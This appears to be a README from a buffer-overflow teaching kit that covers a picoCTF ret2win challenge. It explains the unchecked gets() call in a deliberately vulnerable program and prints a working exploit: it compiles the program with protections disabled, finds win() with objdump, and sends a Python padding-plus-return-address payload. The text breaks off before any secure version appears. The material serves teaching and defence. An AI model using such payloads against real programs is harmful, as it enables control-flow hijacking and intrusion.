# picoCTF Buffer Overflow – Secure Versions (ret2win Defense)

## 1. Original Vulnerability (ret2win)

The original program (`vuln.c`) lives in:

`vulnerable-programs/picoctf-bof1/vuln.c`

Key points:

- It uses `gets(buffer)` to read input into a **32-byte** buffer.
- `gets()` does **not** check input length → you can overflow past the buffer.
- There is a `win()` function that is **never called normally**.
- By overflowing the buffer, the attacker overwrites the **return address** and makes it jump to `win()` instead of returning to `main()`.

Example attack:

```bash
cd ~/buffer-overflow-teaching-kit/vulnerable-programs/picoctf-bof1

# Compile vulnerable version
gcc -m32 -fno-stack-protector -no-pie -o vuln vuln.c

# Confirm it’s non-PIE (fixed addresses)
file vuln

# Find win() address
objdump -d vuln | grep win

# Use 44 bytes of padding + win() address
python3 -c 'import sys, struct; sys.stdout.buffer.write(b"A"*44 + struct.pack("<I", 0x08049186))' | ./vuln
